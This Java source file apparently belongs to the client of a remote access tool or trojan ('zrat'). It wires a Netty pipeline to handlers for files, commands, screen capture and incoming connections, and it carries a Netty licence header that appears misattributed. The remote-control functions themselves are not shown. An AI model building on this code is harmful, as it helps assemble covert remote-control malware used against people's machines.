/*
 * Copyright 2009 Red Hat, Inc.
 *
 * Red Hat licenses this file to you under the Apache License, version 2.0
 * (the "License"); you may not use this file except in compliance with the
 * License.  You may obtain a copy of the License at:
 *
 *    http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  See the
 * License for the specific language governing permissions and limitations
 * under the License.
 */
package com.zrat.client.nio.factory;

import static org.jboss.netty.channel.Channels.pipeline;

import org.jboss.netty.channel.ChannelPipeline;
import org.jboss.netty.channel.ChannelPipelineFactory;
import org.jboss.netty.handler.codec.compression.ZlibDecoder;
import org.jboss.netty.handler.codec.compression.ZlibEncoder;
import org.jboss.netty.handler.codec.compression.ZlibWrapper;
import org.jboss.netty.handler.codec.http.HttpClientCodec;
import org.jboss.netty.handler.codec.serialization.ObjectDecoder;
import org.jboss.netty.handler.codec.serialization.ObjectEncoder;
import org.jboss.netty.util.Timer;

import com.zrat.client.nio.handler.AcceptConnectionHandler;
import com.zrat.client.nio.handler.CommandHandler;
import com.zrat.client.nio.handler.FileHandler;
import com.zrat.client.nio.handler.GetIPHttpResponseHandler;
import com.zrat.client.nio.handler.ScreenHandler;
import com.zrat.client.nio.handler.UpdateDomainHttpResponseHandler;

/**
 * @author <a href="http://www.jboss.org/netty/">The Netty Project</a>
 * @author <a href="http://gleamynode.net/">Trustin Lee</a>
 * @version $Rev: 2315 $, $Date: 2010-06-23 14:16:47 +0900 (Wed, 23 Jun 2010) $
 */
public class ClientNIOPipelineFactory implements ChannelPipelineFactory {

	private Timer timer;
	protected static final int READ_TIMEOUT = 10;
	protected static final int WRITE_TIMEOUT = 10;
	
	public ClientNIOPipelineFactory(Timer timer){
		this.timer = timer;
	}
	
    public ChannelPipeline getPipeline() throws Exception {
        ChannelPipeline p = pipeline();
        //p.addLast("idlehandler", new RatIdleStateHandler(timer,READ_TIMEOUT,WRITE_TIMEOUT,0)); 
        //p.addLast("read",new ReadTimeoutHandler(timer, READ_TIMEOUT));
        //p.addLast("writeTimeout", new WriteTimeoutHandler(timer,WRITE_TIMEOUT));
      
        p.addLast("encoder", new ObjectEncoder());
        p.addLast("decoder", new ObjectDecoder());
//        p.addLast("deflater", new ZlibEncoder(ZlibWrapper.ZLIB));
//        p.addLast("inflater", new ZlibDecoder(ZlibWrapper.ZLIB));

        p.addLast("fileHandler", new FileHandler());
        p.addLast("commandHandler", new CommandHandler());
        p.addLast("screenHandler", new ScreenHandler());
        p.addLast("accept", new AcceptConnectionHandler());
        return p;
    }
}
